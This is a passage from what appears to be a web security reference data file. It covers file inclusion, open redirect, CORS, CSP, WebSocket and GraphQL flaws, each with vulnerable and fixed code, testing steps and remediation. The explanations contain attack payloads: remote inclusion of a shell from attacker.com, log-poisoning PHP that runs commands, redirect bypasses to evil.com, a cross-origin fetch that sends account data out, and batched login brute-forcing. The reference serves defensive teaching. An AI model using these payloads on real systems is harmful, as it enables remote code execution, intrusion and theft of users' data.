          "include(__DIR__ . '/pages/' . $page . '.php'); // resolved against a fixed base, from an allowlist\n" +
          "?>",
        explanation:
          "With allow_url_include enabled (legacy configuration), requesting " +
          "?page=http://attacker.com/shell makes PHP fetch and execute " +
          "http://attacker.com/shell.php directly -- immediate RCE. Even with RFI disabled, " +
          "LFI remains fully exploitable: ?page=../../../../var/log/apache2/access reads the " +
          "Apache access log; if the attacker first sends a request with a crafted User-Agent " +
          "header containing PHP code (<?php system($_GET['c']); ?>), that payload gets " +
          "logged verbatim, and the subsequent LFI request that includes the log file " +
          "executes it -- classic log-poisoning RCE. The fix replaces free-form path " +
          "construction with a strict allowlist of valid page identifiers mapped to a fixed, " +
          "hardcoded base directory, so no attacker-controlled string ever reaches the file " +
          "path passed to include()."
      }
    ],
    detection_methods: [
      "Inject path traversal sequences targeting well-known local files into any parameter that appears to select a page/template/module",
      "Test PHP wrapper schemes (php://filter/convert.base64-encode/resource=index.php) to detect LFI even when direct traversal is filtered, since this discloses source code rather than requiring code execution",
      "Test a fully qualified external URL as the parameter value to check for RFI (allow_url_include enabled)",
      "If LFI is confirmed but not RFI, investigate log-poisoning and session-file-inclusion chains for escalation to RCE"
    ],
    tools: ["Burp Suite", "LFISuite", "kadimus", "fimap"],
    automated_testing:
      "fimap automates LFI/RFI detection and exploitation: `python fimap.py -u " +
      "\"https://target/index.php?page=test\"` fuzzes common traversal and wrapper payloads, " +
      "detects RFI capability by testing an external URL inclusion, and offers a shell if a " +
      "working RCE chain (RFI, or LFI plus log/session poisoning) is confirmed.",
    manual_testing: [
      "Identify parameters that select a page, module, template, or language file, which are the most common LFI/RFI injection points",
      "Test basic traversal to a known local file (/etc/passwd) with varying depth and encoding",
      "Test the php://filter wrapper to extract source code even when direct file content isn't otherwise returned in a readable form",
      "Test whether a fully qualified external URL is accepted (RFI capability check) using a benign test URL under your control before attempting an actual payload",
      "If only LFI is available, attempt log poisoning: inject a PHP payload into a request header (User-Agent) or parameter that gets logged, then include the log file via the LFI",
      "Test inclusion of the PHP session file (typically /var/lib/php/sessions/sess_[PHPSESSID]) after writing attacker-controlled data into a session variable, as an alternative to log poisoning"
    ],
    remediation:
      "Never build include/require paths from user input; use a strict allowlist mapping " +
      "user-facing identifiers to fixed, hardcoded file paths. Disable allow_url_include and " +
      "allow_url_fopen in php.ini unless there is a specific, well-understood need. Keep the " +
      "web/application server's log files outside any directory reachable via LFI, and " +
      "restrict session file storage location and permissions. Apply the same path- " +
      "containment validation used for path traversal as a defense-in-depth layer even where " +
      "an allowlist is already in place.",
    references: [
      "https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion",
      "https://cwe.mitre.org/data/definitions/98.html"
    ],
    difficulty: "Medium",
    commonness: "Common"
  },

  // ===========================================================================
  // REDIRECTS, CORS, CSP, WEBSOCKETS
  // ===========================================================================

  {
    id: "open-redirect",
    name: "Open Redirect",
    category: "Access Control",
    cwe: "CWE-601",
    owasp_category: "A01:2021 - Broken Access Control",
    description:
      "Open redirect occurs when an application redirects users to a URL supplied via a " +
      "request parameter without validating that the destination is an internal or " +
      "otherwise trusted location, allowing an attacker to craft a link that appears to " +
      "originate from the trusted application domain but ultimately sends the victim to an " +
      "attacker-controlled site. This is heavily used in phishing campaigns because links " +
      "starting with the legitimate, trusted domain (https://real-bank.com/logout?" +
      "redirect=https://evil.com) bypass casual URL inspection and email security filters " +
      "that primarily check the domain of the first hop, and the initial trusted domain in " +
      "the link builds false confidence in the victim.\n\n" +
      "Open redirect can also be chained with OAuth flows (see oauth-redirect-uri) to steal " +
      "authorization codes or tokens if the OAuth provider's redirect_uri validation trusts " +
      "the vulnerable application's domain broadly rather than an exact registered URI, and " +
      "can facilitate SSRF-adjacent bypass techniques where an SSRF protection's URL " +
      "allowlist check is satisfied by the initial trusted domain that then redirects " +
      "internally.",
    impact:
      "High-credibility phishing (the initial link legitimately points at the trusted " +
      "domain); OAuth token/code theft when chained with lenient redirect_uri validation; " +
      "bypass of SSRF or other URL-allowlist protections that only validate the first hop " +
      "and then follow redirects.",
    examples: [
      {
        title: "Post-login redirect trusting an arbitrary next-URL parameter",
        vulnerable_code:
          "app.get('/login/complete', (req, res) => {\n" +
          "  const next = req.query.next || '/dashboard';\n" +
          "  authenticateAndSetSession(req, res);\n" +
          "  res.redirect(next); // no validation of the destination\n" +
          "});",
        fixed_code:
          "app.get('/login/complete', (req, res) => {\n" +
          "  const next = req.query.next || '/dashboard';\n" +
          "  authenticateAndSetSession(req, res);\n" +
          "  // Only allow relative, same-site paths; reject anything that looks like\n" +
          "  // a scheme-relative or absolute URL to a different host\n" +
          "  const safeNext = /^\\/(?!\\/)[a-zA-Z0-9\\/_?=&-]*$/.test(next) ? next : '/dashboard';\n" +
          "  res.redirect(safeNext);\n" +
          "});",
        explanation:
          "A phishing email links to " +
          "https://real-app.com/login/complete?next=https://evil.com/fake-login, which the " +
          "victim trusts because the visible domain is real-app.com; after authenticating " +
          "(or even before, depending on flow), the browser is redirected to the attacker's " +
          "look-alike page, which can then harvest credentials or deliver malware while the " +
          "victim believes they are still interacting with the legitimate site. The fix " +
          "restricts the redirect target to a strict pattern requiring a single leading " +
          "slash (rejecting // which browsers treat as protocol-relative to an external host) " +
          "followed only by safe path/query characters, falling back to a safe default for " +
          "anything that does not match."
      }
    ],
    detection_methods: [
      "Identify all parameters used in redirect/location logic (next, redirect, return, returnUrl, continue, dest, url) and test each with an external domain value",
      "Test protocol-relative bypass (//evil.com) and whitespace/encoding tricks (/\\evil.com, /%09/evil.com) against naive same-site validation logic",
      "Test whether the check only validates a substring/prefix (e.g. checking startsWith('/'))rather than the fully resolved destination"
    ],
    tools: ["Burp Suite", "OpenRedireX", "manual testing"],
    automated_testing:
      "OpenRedireX fuzzes a target with a comprehensive payload list covering common open " +
      "redirect bypass techniques (protocol-relative URLs, backslash tricks, whitespace/tab " +
      "injection, double-encoding) and reports which parameters/payloads result in an " +
      "off-domain redirect based on the final Location header.",
    manual_testing: [
      "Enumerate every parameter that plausibly feeds a redirect/Location header",
      "Test a fully qualified external URL as the value and observe the resulting Location header",
      "Test protocol-relative (//evil.com), backslash (/\\evil.com), and whitespace/tab/newline-prefixed variants to bypass naive startsWith('/') style checks",
      "Test whether the validation logic can be bypassed via URL-encoding of the scheme or via an @ userinfo trick (https://trusted.com@evil.com/)",
      "If the application is also an OAuth client or provider, specifically test whether an open redirect on this domain can be chained into OAuth redirect_uri abuse"
    ],
    remediation:
      "Avoid accepting a full URL for post-action redirects at all; use an indexed lookup " +
      "(a short identifier mapped server-side to a small set of known-safe destinations) " +
      "instead. Where a relative path must be accepted from user input, validate it strictly " +
      "against a pattern requiring a single leading slash and rejecting any additional slash, " +
      "backslash, or scheme indicator, and always resolve the final destination and confirm " +
      "it matches the expected host before redirecting, rather than trusting a prefix check " +
      "on the raw string.",
    references: [
      "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
      "https://cwe.mitre.org/data/definitions/601.html"
    ],
    difficulty: "Easy",
    commonness: "Common"
  },

  {
    id: "cors-misconfiguration",
    name: "CORS Misconfiguration",
    category: "Configuration",
    cwe: "CWE-942",
    owasp_category: "A05:2021 - Security Misconfiguration",
    description:
      "Cross-Origin Resource Sharing (CORS) is a browser mechanism that relaxes the " +
      "same-origin policy, allowing a server to explicitly opt in to letting specific " +
      "other origins read responses to cross-origin requests via the " +
      "Access-Control-Allow-Origin response header. Misconfiguration occurs when this " +
      "control is implemented too permissively: reflecting the request's Origin header back " +
      "verbatim as the allowed origin (effectively allowing any site to read the response), " +
      "using a wildcard (*) combined with Access-Control-Allow-Credentials: true (which most " +
      "browsers actually reject as an invalid combination, but developers sometimes achieve " +
      "the equivalent unsafe effect via dynamic Origin reflection instead), or using a " +
      "regex/substring allowlist check that can be bypassed (matching any origin ending in " +
      "'trusted.com', which also matches evil-trusted.com or trusted.com.evil.com).\n\n" +
      "When combined with Access-Control-Allow-Credentials: true, a permissive CORS policy " +
      "lets a malicious site hosted anywhere make authenticated cross-origin requests (using " +
      "the victim's existing session cookies) to the vulnerable API and read the response " +
      "directly in JavaScript -- effectively bypassing the same-origin policy protection that " +
      "CSRF tokens alone do not fully address for GET-based data theft.",
    impact:
      "Cross-origin theft of any data the authenticated user could normally access via the " +
      "API (personal data, account details, API tokens, session-derived secrets), read " +
      "directly by attacker-controlled JavaScript on a completely unrelated site the victim " +
      "merely visits; can be far more severe than CSRF since the attacker receives the " +
      "actual response content, not just the ability to trigger an action blind.",
    examples: [
      {
        title: "Express API reflecting any Origin header with credentials enabled",
        vulnerable_code:
          "app.use((req, res, next) => {\n" +
          "  res.header('Access-Control-Allow-Origin', req.headers.origin); // reflects ANY origin\n" +
          "  res.header('Access-Control-Allow-Credentials', 'true');\n" +
          "  next();\n" +
          "});\n\n" +
          "app.get('/api/account', requireAuth, (req, res) => {\n" +
          "  res.json({ email: req.user.email, apiKey: req.user.apiKey, balance: req.user.balance });\n" +
          "});",
        fixed_code:
          "const ALLOWED_ORIGINS = new Set([\n" +
          "  'https://app.example.com',\n" +
          "  'https://admin.example.com'\n" +
          "]);\n\n" +
          "app.use((req, res, next) => {\n" +
          "  const origin = req.headers.origin;\n" +
          "  if (origin && ALLOWED_ORIGINS.has(origin)) { // exact match against a fixed allowlist\n" +
          "    res.header('Access-Control-Allow-Origin', origin);\n" +
          "    res.header('Access-Control-Allow-Credentials', 'true');\n" +
          "    res.header('Vary', 'Origin');\n" +
          "  }\n" +
          "  next();\n" +
          "});\n\n" +
          "app.get('/api/account', requireAuth, (req, res) => {\n" +
          "  res.json({ email: req.user.email, apiKey: req.user.apiKey, balance: req.user.balance });\n" +
          "});",
        explanation:
          "An attacker hosts evil.com with a page that runs fetch('https://target/api/" +
          "account', { credentials: 'include' }).then(r => r.json()).then(data => " +
          "exfiltrate(data)); because the vulnerable server reflects whatever Origin the " +
          "browser sends and also allows credentials, the browser includes the victim's " +
          "session cookie and, critically, permits the attacker's JavaScript to actually read " +
          "the response body containing the victim's email, API key, and balance. The fix " +
          "checks the Origin against an exact-match allowlist of known, trusted frontend " +
          "origins before ever setting Access-Control-Allow-Origin, and adds the Vary: Origin " +
          "header so caching layers do not serve one origin's CORS headers to another."
      }
    ],
    detection_methods: [
      "Send a request with an arbitrary, attacker-controlled Origin header and check whether Access-Control-Allow-Origin reflects it back",
      "Check whether Access-Control-Allow-Credentials: true is present alongside a permissive or reflected origin policy",
      "Test null origin (Origin: null, achievable via a sandboxed iframe or certain redirect chains) against the allowlist logic",
      "If a substring/suffix-based allowlist is suspected, test crafted origins like evil-trusted-domain.com or trusted-domain.com.evil.com"
    ],
    tools: ["Burp Suite", "CORScanner", "manual curl/fetch testing"],
    automated_testing:
      "CORScanner automates discovery of CORS misconfigurations across a list of " +
      "target URLs, testing origin reflection, null origin acceptance, and subdomain/" +
      "substring bypass patterns, and flags any combination with credentials enabled as " +
      "high severity.",
    manual_testing: [
      "Send a baseline request with no Origin header and note the default CORS headers returned",
      "Resend with Origin: https://evil.com and check if Access-Control-Allow-Origin reflects it",
      "If reflected, check for Access-Control-Allow-Credentials: true in the same response, which confirms full exploitability with session cookies",
      "Test Origin: null and subdomain/substring trick origins against any custom allowlist logic",
      "Build a minimal PoC HTML page hosted on a different origin that performs a credentialed fetch/XHR to the vulnerable endpoint and confirms the response is readable by the attacker's JavaScript"
    ],
    remediation:
      "Validate the Origin header against an exact-match allowlist of known, trusted " +
      "origins -- never reflect the request's Origin verbatim, and never use substring or " +
      "suffix matching. Only enable Access-Control-Allow-Credentials: true for origins that " +
      "genuinely need authenticated cross-origin access, and never combine it with a " +
      "wildcard or reflected origin. Add Vary: Origin to prevent CDN/cache poisoning of CORS " +
      "headers across different requesting origins. For public, non-authenticated APIs, a " +
      "wildcard without credentials is acceptable and simpler.",
    references: [
      "https://portswigger.net/web-security/cors",
      "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html"
    ],
    difficulty: "Medium",
    commonness: "Common"
  },

  {
    id: "csp-bypass",
    name: "Content Security Policy Bypass Techniques",
    category: "Configuration",
    cwe: "CWE-693",
    owasp_category: "A05:2021 - Security Misconfiguration",
    description:
      "Content-Security-Policy is a defense-in-depth browser control that restricts which " +
      "sources scripts, styles, and other resources may be loaded from, intended primarily " +
      "to mitigate the impact of any XSS that slips past output encoding. A CSP is bypassable " +
      "when it is misconfigured in ways that reintroduce script-execution primitives: " +
      "allowing 'unsafe-inline' (permits any inline script, defeating the primary XSS " +
      "mitigation entirely), allowing 'unsafe-eval', including overly broad script-src " +
      "sources (a wildcard subdomain like *.cdn.com that includes an attacker-uploadable or " +
      "otherwise compromisable path), or allowlisting a domain that hosts a JSONP endpoint " +
      "or an AngularJS/old library version with a documented sandbox-escape gadget that " +
      "can be abused to execute arbitrary script despite the restrictive policy.\n\n" +
      "A particularly common real-world bypass pattern involves allowlisted script sources " +
      "that host user-uploadable content or old, vulnerable JavaScript library versions " +
      "(e.g. an allowlisted CDN domain that also serves an old AngularJS build with a known " +
      "template-injection-to-CSP-bypass gadget), since the CSP only restricts the *domain* a " +
      "script loads from, not what that domain's content can do once loaded.",
    impact:
      "Full defeat of a security control specifically deployed to limit XSS impact, " +
      "restoring the complete impact of any underlying XSS vulnerability (session theft, " +
      "account takeover); false sense of security if the policy is deployed without genuinely " +
      "auditing its allowlisted sources for exploitable content.",
    examples: [
      {
        title: "CSP undermined by 'unsafe-inline' negating its own purpose",
        vulnerable_code:
          "// Response header:\n" +
          "// Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com",
        fixed_code:
          "// Response header (nonce-based, no unsafe-inline/unsafe-eval):\n" +
          "// Content-Security-Policy: default-src 'self'; script-src 'nonce-{RANDOM_PER_REQUEST}' 'strict-dynamic'; object-src 'none'; base-uri 'self'\n\n" +
          "// Server generates a fresh nonce per response and embeds it in both the header\n" +
          "// and every legitimate inline/script tag:\n" +
          "// <script nonce=\"{RANDOM_PER_REQUEST}\" src=\"/app.js\"></script>",
        explanation:
          "'unsafe-inline' in script-src permits any inline <script> block or inline event " +
          "handler to execute, which is precisely the primitive CSP is meant to restrict, so " +
          "any XSS vulnerability elsewhere in the application executes exactly as if no CSP " +
          "were present at all -- the policy provides essentially no real mitigation. The fix " +
          "switches to a per-request cryptographic nonce that must exactly match between the " +
          "CSP header and each legitimate script tag; because an attacker cannot predict the " +
          "nonce value in advance, injected <script> tags without the correct nonce are " +
          "blocked by the browser even if the underlying XSS injection point still exists, " +
          "and 'strict-dynamic' allows those trusted, nonce-tagged scripts to load further " +
          "scripts dynamically without needing to allowlist every third-party domain " +
          "individually."
      }
    ],
    detection_methods: [
      "Retrieve and parse the Content-Security-Policy header for weak directives (unsafe-inline, unsafe-eval, overly broad wildcard sources, data: in script-src)",
      "Cross-reference every allowlisted script-src domain against known JSONP endpoints or vulnerable library versions hosted there that could serve as a bypass gadget",
      "Test whether the policy actually applies to the response containing the XSS (some applications inconsistently apply CSP only to certain routes)"
    ],
    tools: ["Google CSP Evaluator", "Burp Suite (manual header inspection)", "CSP bypass payload research (jsonp gadget lists)"],
    automated_testing:
      "Google's CSP Evaluator (available as a web tool and library) parses a given policy " +
      "and flags common weaknesses (unsafe-inline, unsafe-eval, overly permissive host " +
      "sources, missing object-src/base-uri restrictions) with specific bypass guidance for " +
      "each finding, and is the standard first pass before manual gadget-hunting against " +
      "allowlisted domains.",
    manual_testing: [
      "Retrieve the CSP header (or meta tag equivalent) from every relevant page and note all directives, especially script-src",
      "Flag any use of unsafe-inline, unsafe-eval, wildcard host sources, or overly broad domain allowlisting",
      "For each allowlisted script-src domain, research whether it hosts JSONP endpoints, old library versions with known sandbox-escape gadgets, or user-uploadable content",
      "If an XSS injection point exists elsewhere, attempt to actually trigger script execution within the constraints of the observed policy to confirm real-world exploitability versus theoretical weakness",
      "Check for missing object-src 'none' and base-uri 'self', which are commonly overlooked directives that can enable plugin-based or <base>-tag-based bypasses"
    ],
    remediation:
      "Avoid 'unsafe-inline' and 'unsafe-eval' entirely; use a per-request nonce or " +
      "content-hash-based approach combined with 'strict-dynamic' for legitimate dynamic " +
      "script loading. Keep the script-src allowlist as narrow as possible and audit every " +
      "allowlisted domain for JSONP endpoints or vulnerable hosted libraries that could serve " +
      "as bypass gadgets. Always set object-src 'none' and base-uri 'self' to close common " +
      "secondary bypass vectors. Treat CSP strictly as defense-in-depth -- it must never be " +
      "relied upon as the sole mitigation for XSS, and output encoding/sanitization remains " +
      "the primary control.",
    references: [
      "https://csp-evaluator.withgoogle.com/",
      "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
      "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"
    ],
    difficulty: "Hard",
    commonness: "Common"
  },

  {
    id: "websocket-vulnerabilities",
    name: "WebSocket Security Vulnerabilities",
    category: "Configuration",
    cwe: "CWE-346",
    owasp_category: "A01:2021 - Broken Access Control",
    description:
      "WebSocket connections are established via an HTTP Upgrade handshake and, critically, " +
      "the initial handshake request is subject to the browser's normal cookie-attachment " +
      "behavior but is NOT protected by the same-origin policy the way XHR/fetch requests " +
      "are -- a WebSocket connection can be initiated from any origin, and the server must " +
      "explicitly validate the Origin header during the handshake if it wants to restrict " +
      "which sites may open a connection (analogous to CSRF, sometimes called Cross-Site " +
      "WebSocket Hijacking). Applications that authenticate WebSocket connections purely via " +
      "the ambient session cookie without checking Origin are vulnerable to a malicious page " +
      "opening a WebSocket connection to the target on the victim's behalf and both sending " +
      "and receiving messages within that authenticated session.\n\n" +
      "Beyond the handshake-level origin issue, WebSocket message payloads are also a full " +
      "injection surface in their own right -- messages are frequently JSON or other " +
      "structured data processed server-side with the same injection risks (SQLi, command " +
      "injection, deserialization) as any HTTP request body, but are sometimes tested less " +
      "rigorously because WebSocket traffic requires different tooling than standard HTTP " +
      "request interception.",
    impact:
      "Cross-Site WebSocket Hijacking allows a malicious site to establish an authenticated " +
      "WebSocket session as the victim and both send commands and read real-time data " +
      "(chat messages, live financial data, notifications) without the victim's knowledge; " +
      "unvalidated message content processed server-side carries the full range of standard " +
      "injection risks.",
    examples: [
      {
        title: "WebSocket server authenticating purely by cookie with no Origin validation",
        vulnerable_code:
          "const wss = new WebSocket.Server({ port: 8080 });\n" +
          "wss.on('connection', (ws, req) => {\n" +
          "  const sessionId = parseCookie(req.headers.cookie).sessionId;\n" +
          "  const user = getSessionUser(sessionId); // no Origin check performed at all\n" +
          "  if (!user) return ws.close();\n" +
          "  ws.on('message', (msg) => handleChatMessage(user, msg));\n" +
          "});",
        fixed_code:
          "const ALLOWED_ORIGINS = new Set(['https://app.example.com']);\n\n" +
          "const wss = new WebSocket.Server({ port: 8080 });\n" +
          "wss.on('connection', (ws, req) => {\n" +
          "  const origin = req.headers.origin;\n" +
          "  if (!ALLOWED_ORIGINS.has(origin)) {\n" +
          "    return ws.close(1008, 'Origin not allowed');\n" +
          "  }\n" +
          "  const sessionId = parseCookie(req.headers.cookie).sessionId;\n" +
          "  const user = getSessionUser(sessionId);\n" +
          "  if (!user) return ws.close(1008, 'Unauthorized');\n" +
          "  ws.on('message', (msg) => {\n" +
          "    const parsed = safeParseChatMessage(msg); // validate/schema-check every inbound message\n" +
          "    if (!parsed) return;\n" +
          "    handleChatMessage(user, parsed);\n" +
          "  });\n" +
          "});",
        explanation:
          "A page on evil.com runs new WebSocket('wss://target/chat'); the browser " +
          "automatically attaches the target's session cookie to the WebSocket handshake " +
          "exactly as it would for a normal cross-site form submission, and since the server " +
          "never checks the handshake's Origin header, the connection is accepted and " +
          "authenticated as the victim, letting the attacker's page read live chat messages " +
          "and send messages as the victim. The fix explicitly validates the Origin header " +
          "during the handshake against an allowlist before ever checking the session cookie, " +
          "closing the connection immediately for any disallowed origin, and additionally " +
          "validates the structure of every inbound message rather than passing it directly " +
          "to a handler."
      }
    ],
    detection_methods: [
      "Attempt to open a WebSocket connection to the target from a page hosted on a different origin while authenticated, and check whether the handshake succeeds and the session context is honored",
      "Inspect whether the server's handshake handler references/validates the Origin header at all",
      "Test WebSocket message payloads with standard injection payloads (SQLi, command injection, XSS if messages are later rendered) exactly as you would test an equivalent HTTP endpoint"
    ],
    tools: ["Burp Suite (WebSocket message interception and repeat)", "browser DevTools Network/WS tab", "custom PoC HTML pages with new WebSocket()"],
    automated_testing:
      "Burp Suite natively intercepts and allows repeating/modifying WebSocket messages in " +
      "its proxy history, letting you fuzz message content with the same Intruder-style " +
      "payload techniques used for HTTP bodies; Origin-validation testing is generally " +
      "manual, using a crafted standalone HTML PoC page opened in an authenticated browser " +
      "session to confirm cross-site hijacking works end-to-end.",
    manual_testing: [
      "Capture the WebSocket handshake request and note whether/how the server appears to validate Origin",
      "Build a minimal standalone HTML PoC that opens a WebSocket connection to the target from a different origin and attempt to send/receive data while authenticated in the same browser",
      "Fuzz WebSocket message content with injection payloads relevant to how the server processes the message (database queries, command execution, HTML rendering of received messages)",
      "Test whether authorization is re-checked per-message (can a lower-privileged connected user send a message type reserved for admins) or only once at handshake time"
    ],
    remediation:
      "Validate the Origin header during the WebSocket handshake against an explicit " +
      "allowlist before accepting the connection, exactly analogous to CSRF protection for " +
      "regular HTTP endpoints. Do not rely on cookies alone for WebSocket authentication; " +
      "consider requiring a short-lived token obtained via an authenticated same-origin HTTP " +
      "request and passed as a WebSocket subprotocol or initial message. Treat every inbound " +
      "WebSocket message with the same input validation and injection-prevention rigor as " +
      "an HTTP request body, and re-check authorization per-message for any privileged " +
      "message types, not just once at connection time.",
    references: [
      "https://portswigger.net/web-security/websockets",
      "https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#web-sockets"
    ],
    difficulty: "Medium",
    commonness: "Uncommon"
  },

  // ===========================================================================
  // GRAPHQL
  // ===========================================================================

  {
    id: "graphql-introspection",
    name: "GraphQL Introspection Information Disclosure",
    category: "Configuration",
    cwe: "CWE-200",
    owasp_category: "A05:2021 - Security Misconfiguration",
    description:
      "GraphQL's introspection system lets a client query the schema itself (via the " +
      "__schema and __type meta-fields) to discover every type, field, argument, mutation, " +
      "and subscription the API exposes -- an extremely useful feature during development " +
      "(it powers tools like GraphQL Playground/GraphiQL and client code generation) but a " +
      "significant information disclosure risk if left enabled in production. An attacker " +
      "with introspection access can fully map the API's attack surface in a single query, " +
      "discovering internal-sounding fields, deprecated-but-still-functional mutations, " +
      "debug/admin operations, and field names that hint at business logic never intended " +
      "for public documentation.\n\n" +
      "While disabling introspection does not fix any actual authorization or injection " +
      "vulnerability, it substantially raises the effort required for an attacker to " +
      "discover the API surface (forcing them to guess field/type names or rely on brute-force " +
      "wordlists), and it commonly leaks internal implementation details -- deprecated fields " +
      "still marked as functional, admin-only mutations with names like " +
      "impersonateUser or resetAnyPassword -- that were never meant to be discoverable by " +
      "external parties even if properly access-controlled.",
    impact:
      "Complete disclosure of the API's full schema including hidden/internal/deprecated " +
      "operations, dramatically accelerating an attacker's ability to find authorization " +
      "flaws, injection points, and sensitive administrative functionality that would " +
      "otherwise require extensive blind enumeration to discover.",
    examples: [
      {
        title: "Apollo Server left with introspection enabled by default in production",
        vulnerable_code:
          "const server = new ApolloServer({\n" +
          "  typeDefs,\n" +
          "  resolvers,\n" +
          "  // introspection defaults to true unless NODE_ENV === 'production' in\n" +
          "  // older Apollo Server versions -- easy to get wrong via env misconfiguration\n" +
          "});",
        fixed_code:
          "const server = new ApolloServer({\n" +
          "  typeDefs,\n" +
          "  resolvers,\n" +
          "  introspection: process.env.ALLOW_GRAPHQL_INTROSPECTION === 'true', // explicit opt-in only\n" +
          "  playground: process.env.ALLOW_GRAPHQL_INTROSPECTION === 'true'\n" +
          "});\n" +
          "// Explicit, independent of NODE_ENV detection quirks or deployment misconfiguration",
        explanation:
          "Relying on implicit environment-based defaults for whether introspection is " +
          "enabled is fragile -- a misconfigured NODE_ENV variable in a container deployment, " +
          "a staging environment accidentally exposed, or an older library version with " +
          "different default behavior can all leave introspection live in production, letting " +
          "anyone send a standard __schema query and receive the API's complete type graph. " +
          "The fix makes the introspection flag an explicit, independently-controlled " +
          "environment variable rather than relying on framework default behavior tied to " +
          "NODE_ENV, removing ambiguity about what is enabled in any given deployment."
      }
    ],
    detection_methods: [
      "Send a standard introspection query ({ __schema { types { name fields { name } } } }) to the GraphQL endpoint and check whether a full schema is returned",
      "If introspection is disabled, attempt field/type name enumeration via error-message-based inference (submitting queries with guessed field names and observing 'did you mean' suggestions, which some GraphQL implementations helpfully include even with introspection off)",
      "Check for exposed GraphQL IDE tools (GraphQL Playground, GraphiQL, Apollo Sandbox) reachable in production, which typically require introspection to function fully"
    ],
    tools: ["GraphQL Voyager (schema visualization)", "InQL (Burp Suite extension)", "clairvoyance (schema recovery when introspection is disabled)"],
    automated_testing:
      "InQL (a Burp Suite extension) automatically sends introspection queries against a " +
      "discovered GraphQL endpoint, parses the resulting schema, and generates a categorized " +
      "list of every query/mutation for further manual testing; if introspection is " +
      "disabled, clairvoyance attempts schema reconstruction via field-name wordlist " +
      "brute-forcing against error-message suggestion behavior.",
    manual_testing: [
      "Locate the GraphQL endpoint (commonly /graphql, /api/graphql, /v1/graphql) via crawling, JS bundle analysis, or common-path wordlists",
      "Send a standard introspection query and check whether the response includes schema data",
      "If introspection is disabled, test whether 'did you mean' style error suggestions leak field names when a close-but-incorrect field name is queried",
      "Review any discovered internal/deprecated/admin-sounding fields for missing or inadequate authorization checks",
      "Check whether any GraphQL IDE (Playground, GraphiQL) is reachable and functional in the production environment"
    ],
    remediation:
      "Disable introspection in production via an explicit configuration flag independent of " +
      "environment-detection heuristics, and disable/remove any GraphQL IDE tooling from " +
      "production deployments entirely. Recognize that disabling introspection is obscurity, " +
      "not a substitute for proper field-level and object-level authorization checks on every " +
      "resolver -- every query and mutation must independently enforce access control " +
      "regardless of whether its existence is discoverable via introspection.",
    references: [
      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL",
      "https://graphql.org/learn/introspection/"
    ],
    difficulty: "Easy",
    commonness: "Common"
  },

  {
    id: "graphql-batching",
    name: "GraphQL Batching Attacks",
    category: "Access Control",
    cwe: "CWE-799",
    owasp_category: "A04:2021 - Insecure Design",
    description:
      "GraphQL natively supports sending multiple queries or mutations in a single HTTP " +
      "request, either via query aliasing (multiple instances of the same operation with " +
      "different aliases in one query document) or via array-based batching supported by " +
      "many server implementations (submitting a JSON array of separate query objects in one " +
      "POST body). This is a legitimate performance feature but becomes a security issue " +
      "when it is used to bypass request-level protections that were designed assuming one " +
      "logical operation per HTTP request -- most critically, rate limiting and login " +
      "brute-force protections that count requests rather than operations.\n\n" +
      "A textbook exploitation is submitting a single GraphQL request containing 1,000 " +
      "aliased login mutations, each attempting a different password guess against the same " +
      "account, in one HTTP call -- if the rate limiter counts HTTP requests rather than the " +
      "individual operations within the batch, this single request delivers 1,000 login " +
      "attempts while registering as only one against the rate limit, completely " +
      "neutralizing the intended brute-force protection.",
    impact:
      "Complete bypass of rate limiting and brute-force protection, enabling credential " +
      "stuffing and password brute-forcing at massive scale within a small number of actual " +
      "HTTP requests; can also be used to amplify resource-exhaustion attacks by batching " +
      "many expensive operations into one request.",
    examples: [
      {
        title: "GraphQL login mutation with per-request but not per-operation rate limiting",
        vulnerable_code:
          "app.use('/graphql', rateLimit({ windowMs: 60000, max: 5 })); // 5 HTTP requests/min\n\n" +
          "const resolvers = {\n" +
          "  Mutation: {\n" +
          "    login: async (_, { email, password }) => {\n" +
          "      const user = await User.findOne({ email });\n" +
          "      if (user && await bcrypt.compare(password, user.passwordHash)) {\n" +
          "        return { token: signToken(user) };\n" +
          "      }\n" +
          "      throw new AuthenticationError('Invalid credentials');\n" +
          "    }\n" +
          "  }\n" +
          "};",
        fixed_code:
          "const { createComplexityLimitRule } = require('graphql-validation-complexity');\n\n" +
          "const server = new ApolloServer({\n" +
          "  typeDefs, resolvers,\n" +
          "  validationRules: [\n" +
          "    createComplexityLimitRule(20, { onCost: (cost) => console.log('query cost', cost) })\n" +
          "  ]\n" +
          "});\n\n" +
          "const resolvers2 = {\n" +
          "  Mutation: {\n" +
          "    login: async (_, { email, password }, context) => {\n" +
          "      // Per-account, per-operation attempt tracking, independent of HTTP request count\n" +
          "      const attempts = await getRecentFailedAttempts(email);\n" +
          "      if (attempts >= 5) throw new AuthenticationError('Account temporarily locked');\n" +
          "      const user = await User.findOne({ email });\n" +
          "      const valid = user && await bcrypt.compare(password, user.passwordHash);\n" +
          "      if (!valid) { await recordFailedAttempt(email); throw new AuthenticationError('Invalid credentials'); }\n" +
          "      await clearFailedAttempts(email);\n" +
          "      return { token: signToken(user) };\n" +
          "    }\n" +
          "  }\n" +
          "};",
        explanation:
          "An attacker sends a single POST to /graphql with a query document containing " +
          "1,000 aliased mutations: mutation { a1: login(email:\"victim@x.com\", " +
          "password:\"pass1\") { token } a2: login(email:\"victim@x.com\", password:\"pass2\") " +
          "{ token } ... }; the HTTP-request-counting rate limiter sees exactly one request " +
          "and allows it through untouched, while the resolver executes all 1,000 login " +
          "attempts server-side within that single call. The fix adds a query complexity/cost " +
          "limit that rejects overly large batched operations outright, and, more " +
          "importantly, moves brute-force protection to per-account attempt tracking " +
          "evaluated inside the resolver itself (which correctly counts each aliased " +
          "operation individually) rather than relying solely on an HTTP-request-level rate " +
          "limiter that cannot see inside the batch."
      }
    ],
    detection_methods: [
      "Submit a GraphQL query containing many aliased instances of a sensitive mutation (login, password reset, coupon redemption) in a single request and check if all are processed",
      "Test array-based batching (submitting a JSON array of query objects as the request body) if the server implementation supports it",
